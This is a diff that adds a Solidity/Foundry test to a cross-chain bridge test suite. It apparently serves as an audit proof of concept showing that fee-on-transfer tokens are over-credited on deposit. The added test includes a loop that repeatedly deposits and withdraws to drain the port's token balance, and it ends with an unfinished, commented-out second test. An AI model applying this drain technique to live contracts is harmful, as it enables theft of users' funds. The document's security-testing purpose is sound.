@@ -2,8 +2,11 @@
 pragma solidity ^0.8.16;
 
 import "./helpers/ImportHelper.sol";
+import {ERC20} from "./weird-tokens/ERC20.sol";
+import {TransferFeeToken} from "./weird-tokens/TransferFeeToken.sol";
+import {StdCheatsSafe} from "forge-std/StdCheats.sol";
 
-contract ArbitrumBranchTest is DSTestPlus {
+contract ArbitrumBranchTest is DSTestPlus, StdCheatsSafe {
     receive() external payable {}
 
     uint32 nonce;
@@ -576,6 +579,196 @@ contract ArbitrumBranchTest is DSTestPlus {
             "User should have 100 global tokens"
         );
     }
+
+    // @audit Test passed for depositToPort
+    function test_FeeOnTransferTokensAreNotSupported() public {
+        uint256 fee = 10 ether;
+        uint256 totalSupply = 100_000_000 ether; // 100 million
+        address user = makeAddr("Alice");
+        uint256 userBalance = 1000 ether;
+        uint256 localPortBalance = 1000 ether;
+        uint256 userDeposit = 100 ether;
+
+        // Create new Fee on transfer token
+        TransferFeeToken transferFeeToken = new TransferFeeToken(totalSupply,fee);
+
+        // Adding token to the arbitrum root chain
+        _addLocalTokenArbitrum(address(transferFeeToken));
+
+        // giving some token to the user and branch port
+        transferFeeToken.transfer(user, userBalance);
+        transferFeeToken.transfer(address(localPortAddress), localPortBalance);
+
+        // checking user got the correct balance
+        require(transferFeeToken.balanceOf(user) == (userBalance - fee), "invalid balance");
+
+        // getting balances before
+        uint256 branchPortBalanceBefore = transferFeeToken.balanceOf(address(localPortAddress));
+        uint256 userBalanceBefore = transferFeeToken.balanceOf(address(user));
+        uint256 userBalanceBeforeHToken = MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user);
+
+        hevm.startPrank(user);
+        // approving arbtirum branch bridge agent
+        transferFeeToken.approve(address(localPortAddress), userDeposit);
+
+        require(transferFeeToken.allowance(user, address(localPortAddress)) == userDeposit, "invalid allowance");
+
+        // trying to deposit the token to the port
+        arbitrumCoreBridgeAgent.depositToPort(address(transferFeeToken), userDeposit);
+        hevm.stopPrank();
+
+        // getting balances after
+        // getting balances before
+        uint256 branchPortBalanceAfter = transferFeeToken.balanceOf(address(localPortAddress));
+        uint256 userBalanceAfter = transferFeeToken.balanceOf(address(user));
+        uint256 userBalanceAfterHToken = MockERC20(newArbitrumAssetGlobalAddress).balanceOf(user);
+
+        // balance of branch port should be increased 90 (100 deposit token - fee)
+        require(branchPortBalanceAfter - branchPortBalanceBefore == userDeposit - fee, "invalid balance");
+
+        // balance of user for the token should be 900 (balance before(1000) - deposit(100))
+        require(userBalanceBefore - userBalanceAfter == userDeposit, "invalid balance");
+
+        // balance of user for the h token should be increased by 100 while the actual deposit was 90 token
+        require(userBalanceAfterHToken - userBalanceBeforeHToken == userDeposit, "invalid balance");
+
+        // user now withdraw his balance
+
+        hevm.startPrank(user);
+
+        // trying to withdraw the token to the port
+        arbitrumCoreBridgeAgent.withdrawFromPort(address(newArbitrumAssetGlobalAddress), userDeposit);
+        hevm.stopPrank();
+
+        // after withdraw user should get 90 tokens back as port will pay 10 tokens fee for transfer
+        // total tokens = balance after deposit (900) + deposit (100) - fee (10) = 990
+        require(transferFeeToken.balanceOf(address(user)) == userBalanceAfter + userDeposit - fee, "invalid balance");
+
+        // local port has lost 10 tokens
+        // tokens_after_deposit = balance before depsit(1000) + deposit(100) - fee(10) = 1090
+        // tokens_after_withdraw = tokens_after_deposit(1090) - withdrawn_balance(100) = 990 (fee will not be accounted here since user has 100 htoken)
+        require(
+            transferFeeToken.balanceOf(address(localPortAddress)) == branchPortBalanceAfter - userDeposit,
+            "invalid balance"
+        );
+
+        // using same strategy again and again, user can drain most of the protocl funds
+        // this scenario is very rare and costly. We know that in order to execute this type
+        // of attack user will have to pay insane amount of fee. This is just for demonstrating
+        // the effect of the issue
+
+        // the check is done to make sure that the localPortAddress has enough token to execute the attack
+        while (transferFeeToken.balanceOf(address(localPortAddress)) > 110 ether) {
+            hevm.startPrank(user);
+
+            // approving arbtirum branch bridge agent
+            transferFeeToken.approve(address(localPortAddress), userDeposit);
+            require(transferFeeToken.allowance(user, address(localPortAddress)) == userDeposit, "invalid allowance");
+
+            // trying to deposit the token to the port
+            arbitrumCoreBridgeAgent.depositToPort(address(transferFeeToken), userDeposit);
+
+            // trying to withdraw the token to the port
+            arbitrumCoreBridgeAgent.withdrawFromPort(address(newArbitrumAssetGlobalAddress), userDeposit);
+            hevm.stopPrank();
+        }
+    }
+
+    function _addLocalTokenArbitrum(address _token) public {
+        // Get some gas.
+        hevm.deal(address(this), 1 ether);
+
+        //Get gas params
+        GasParams memory gasParams = GasParams(0.5 ether, 0.5 ether);
+
+        //Add new localToken
+        arbitrumCoreRouter.addLocalToken(address(_token), gasParams);
+
+        uint256 balanceBefore = MockERC20(wrappedNativeToken).balanceOf(address(coreBridgeAgent));
+
+        newArbitrumAssetGlobalAddress = RootPort(rootPort).getLocalTokenFromUnderlying(address(_token), rootChainId);
+
+        console2.log("New root hToken Address: ", newArbitrumAssetGlobalAddress);
+
+        console2.log(RootPort(rootPort).getGlobalTokenFromLocal(address(_token), rootChainId));
+
+        // require(
+        //     RootPort(rootPort).getGlobalTokenFromLocal(address(_token), rootChainId)
+        //         == address(newArbitrumAssetGlobalAddress),
+        //     "Token should be added"
+        // );
+
+        // require(
+        //     RootPort(rootPort).getLocalTokenFromGlobal(newArbitrumAssetGlobalAddress, rootChainId) == address(_token),
+        //     "Token should be added"
+        // );
+        // require(
+        //     RootPort(rootPort).getUnderlyingTokenFromLocal(address(newArbitrumAssetGlobalAddress), rootChainId)
+        //         == address(_token),
+        //     "Token should be added"
+        // );
+
+        // console2.log("Balance Before: ", balanceBefore);
+        // console2.log("Balance After: ", address(coreBridgeAgent).balance);
+    }
+
+    // @audit checking
+    // function test_FeeOnTransferTokensAreNotSupportedForBridgeOut() public {
+    //     /////////////////////
+    //     //// Basic Setup ////
+    //     /////////////////////
+
+    //     uint256 fee = 10 ether;
+    //     uint256 totalSupply = 100_000_000 ether; // 100 million
+    //     address user = makeAddr("Alice");
+    //     uint256 userBalance = 1000 ether;
+    //     uint256 localPortBalance = 1000 ether;
+    //     uint256 userDeposit = 100 ether;
+
+    //     // Create new Fee on transfer token
+    //     TransferFeeToken transferFeeToken = new TransferFeeToken(totalSupply,fee);
+
+    //     // Adding token to the arbitrum root chain
+    //     _addLocalTokenArbitrum(address(transferFeeToken));
+
+    //     // giving some token to the user and branch port
+    //     transferFeeToken.transfer(user, userBalance);
+    //     transferFeeToken.transfer(address(localPortAddress), localPortBalance);
+    //     require(transferFeeToken.balanceOf(user) == (userBalance - fee), "invalid balance");
+
+    //     /////////////////////
+    //     //// Acutal Test ////
+    //     /////////////////////
+
+    //     // checking user got the correct balance
+
+    //     GasParams memory gasParams = GasParams(0.5 ether, 0.5 ether);
+
+    //     uint256 amountToBridgeAndDeposit
+    //     uint256 amountToBridgeAndTransfer
+
+    //     // Get some gas.
+    //     hevm.deal(address(this), 1 ether);
+
+    //     // Mint Underlying Token.
+    //     arbitrumNativeToken.mint(address(this), 100 ether);
+
+    //     // Approve spend by router
+    //     arbitrumNativeToken.approve(address(localPortAddress), 100 ether);
+
+    //     // Prepare deposit info
+    //     DepositInput memory depositInput = DepositInput({
+    //         hToken: address(newArbitrumAssetGlobalAddress),
+    //         token: address(arbitrumNativeToken),
+    //         amount: 100 ether,
+    //         deposit: 100 ether
+    //     });
+
+    //     //Call Deposit function
+    //     arbitrumMulticallBridgeAgent.callOutSignedAndBridge{value: 1 ether}(
+    //         payable(address(this)), packedData, depositInput, gasParams, true
+    //     );
+    // }
 
     function testDepositToPortUnrecognized() public {
         // Mint Tokens
